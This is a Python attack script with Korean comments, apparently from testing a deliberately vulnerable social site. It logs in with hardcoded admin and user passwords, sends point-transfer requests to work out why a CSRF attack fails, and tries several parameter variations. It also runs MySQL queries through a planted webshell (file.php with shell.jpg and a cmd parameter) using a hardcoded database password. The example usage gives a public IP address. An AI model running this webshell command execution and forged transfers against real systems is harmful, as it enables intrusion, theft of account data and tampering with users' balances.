#!/usr/bin/env python3
"""
수동 포인트 전송 테스트
CSRF가 왜 안되는지 확인
"""

import requests
import sys

class ManualTransferTest:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.session = requests.Session()

    def login_as_admin(self):
        """admin 로그인"""
        print("\n[*] admin 계정으로 로그인 중...")

        login_url = f"{self.base_url}/login.php"
        data = {
            'username': 'admin',
            'password': 'admin123'
        }

        resp = self.session.post(login_url, data=data, allow_redirects=True)

        if 'login.php' not in resp.url:
            print("[+] 로그인 성공!")
            print(f"[+] 세션 쿠키: {self.session.cookies.get_dict()}")
            return True
        else:
            print("[-] 로그인 실패")
            return False

    def check_points(self):
        """현재 포인트 확인"""
        print("\n[*] 현재 포인트 확인 중...")

        resp = self.session.get(f"{self.base_url}/profile.php")

        # 간단한 파싱
        if 'points' in resp.text.lower():
            # 포인트 값 찾기
            import re
            match = re.search(r'포인트[:\s]*(\d+)', resp.text)
            if match:
                points = match.group(1)
                print(f"[+] admin 포인트: {points}P")
                return points

            # 영어 버전
            match = re.search(r'points[:\s]*(\d+)', resp.text, re.IGNORECASE)
            if match:
                points = match.group(1)
                print(f"[+] admin 포인트: {points}P")
                return points

        print("[-] 포인트 정보를 찾을 수 없습니다")
        return None

    def test_manual_transfer(self):
        """수동으로 포인트 전송 테스트"""
        print("\n" + "="*60)
        print("수동 포인트 전송 테스트")
        print("="*60)

        # 전송 전 포인트 확인
        before_points = self.check_points()

        print("\n[*] alice(ID:2)에게 100 포인트 전송 시도...")

        # profile.php에 POST 요청
        transfer_url = f"{self.base_url}/profile.php"
        data = {
            'send_gift': '1',
            'receiver_id': '2',  # alice
            'gift_type': 'diamond',
            'points': '100',
            'message': 'Manual Test'
        }

        print(f"[*] URL: {transfer_url}")
        print(f"[*] Data: {data}")

        resp = self.session.post(transfer_url, data=data, allow_redirects=True)

        print(f"\n[*] 응답 코드: {resp.status_code}")
        print(f"[*] 최종 URL: {resp.url}")

        # 응답 내용 확인
        if '포인트' in resp.text or 'point' in resp.text.lower():
            print("\n[*] 응답 내용에서 포인트 관련 정보:")
            lines = resp.text.split('\n')
            for line in lines:
                if '포인트' in line or 'point' in line.lower() or 'success' in line.lower() or '선물' in line:
                    print(f"    {line.strip()[:200]}")

        # 전송 후 포인트 확인
        print("\n[*] 전송 후 포인트 확인...")
        after_points = self.check_points()

        if before_points and after_points:
            diff = int(before_points) - int(after_points)
            if diff == 100:
                print(f"\n[+] 성공! 포인트 차감됨: {before_points} → {after_points} (-100)")
                return True
            elif diff > 0:
                print(f"\n[?] 포인트 변경됨: {before_points} → {after_points} ({-diff})")
                return True
            else:
                print(f"\n[-] 실패! 포인트 변경 없음: {before_points} → {after_points}")
                return False

        return False

    def check_alice_points(self):
        """alice 포인트 확인"""
        print("\n[*] alice 계정 확인 중...")

        # alice로 로그인
        self.session = requests.Session()  # 새 세션

        login_url = f"{self.base_url}/login.php"
        data = {
            'username': 'alice',
            'password': 'alice2024'
        }

        resp = self.session.post(login_url, data=data, allow_redirects=True)

        if 'login.php' not in resp.url:
            print("[+] alice 로그인 성공")

            # 포인트 확인
            resp = self.session.get(f"{self.base_url}/profile.php")

            import re
            match = re.search(r'포인트[:\s]*(\d+)', resp.text)
            if not match:
                match = re.search(r'points[:\s]*(\d+)', resp.text, re.IGNORECASE)

            if match:
                points = match.group(1)
                print(f"[+] alice 포인트: {points}P")
                return points

        return None

    def check_via_webshell(self):
        """웹쉘로 DB 직접 확인"""
        print("\n[*] 웹쉘로 DB 직접 확인...")

        webshell_url = f"{self.base_url}/file.php"
        params = {
            'name': 'shell.jpg',
            'cmd': "mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e \"SELECT username, points FROM users WHERE username IN ('admin', 'alice', 'bob');\""
        }

        try:
            resp = requests.get(webshell_url, params=params, timeout=10)
            print("\n[+] DB 조회 결과:")
            print(resp.text)
        except Exception as e:
            print(f"[-] 웹쉘 실행 실패: {e}")

    def test_different_parameters(self):
        """다양한 파라미터 조합 테스트"""
        print("\n" + "="*60)
        print("다양한 파라미터 조합 테스트")
        print("="*60)

        test_cases = [
            {
                'name': 'Test 1: 기본 파라미터',
                'data': {
                    'send_gift': '1',
                    'receiver_id': '2',
                    'gift_type': 'coffee',
                    'points': '50',
                    'message': 'Test 1'
                }
            },
            {
                'name': 'Test 2: gift_type 없이',
                'data': {
                    'send_gift': '1',
                    'receiver_id': '2',
                    'points': '50',
                    'message': 'Test 2'
                }
            },
            {
                'name': 'Test 3: message 없이',
                'data': {
                    'send_gift': '1',
                    'receiver_id': '2',
                    'gift_type': 'diamond',
                    'points': '50'
                }
            },
            {
                'name': 'Test 4: GET 방식',
                'url': f"{self.base_url}/profile.php?send_gift=1&receiver_id=2&points=50&gift_type=coffee&message=Test4",
                'method': 'GET'
            }
        ]

        for test in test_cases:
            print(f"\n[*] {test['name']}")

            if test.get('method') == 'GET':
                resp = self.session.get(test['url'])
            else:
                resp = self.session.post(f"{self.base_url}/profile.php", data=test['data'])

            print(f"    응답 코드: {resp.status_code}")

            # 성공/실패 메시지 확인
            if 'success' in resp.text.lower() or '선물' in resp.text or '전송' in resp.text:
                print("    [+] 성공 메시지 발견!")
            elif 'error' in resp.text.lower() or '실패' in resp.text or '부족' in resp.text:
                print("    [-] 에러 메시지 발견")
            else:
                print("    [?] 명확한 응답 없음")

    def run(self):
        """전체 테스트 실행"""
        print("="*60)
        print("포인트 전송 수동 테스트")
        print("="*60)

        # 1. 로그인
        if not self.login_as_admin():
            print("[-] 로그인 실패, 테스트 중단")
            return

        # 2. 웹쉘로 현재 상태 확인
        self.check_via_webshell()

        # 3. 수동 전송 테스트
        success = self.test_manual_transfer()

        # 4. alice 확인
        self.check_alice_points()

        # 5. 다양한 파라미터 테스트
        if not success:
            print("\n[-] 기본 테스트 실패, 다른 방법 시도...")

            # admin으로 다시 로그인
            self.login_as_admin()
            self.test_different_parameters()

        # 6. 최종 상태 확인
        print("\n[*] 최종 상태 확인...")
        self.check_via_webshell()

        print("\n" + "="*60)
        print("테스트 완료")
        print("="*60)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("사용법: python3 test_manual_transfer.py <TARGET_IP>")
        print("예: python3 test_manual_transfer.py 52.78.221.104")
        sys.exit(1)

    target_ip = sys.argv[1]
    tester = ManualTransferTest(target_ip)
    tester.run()
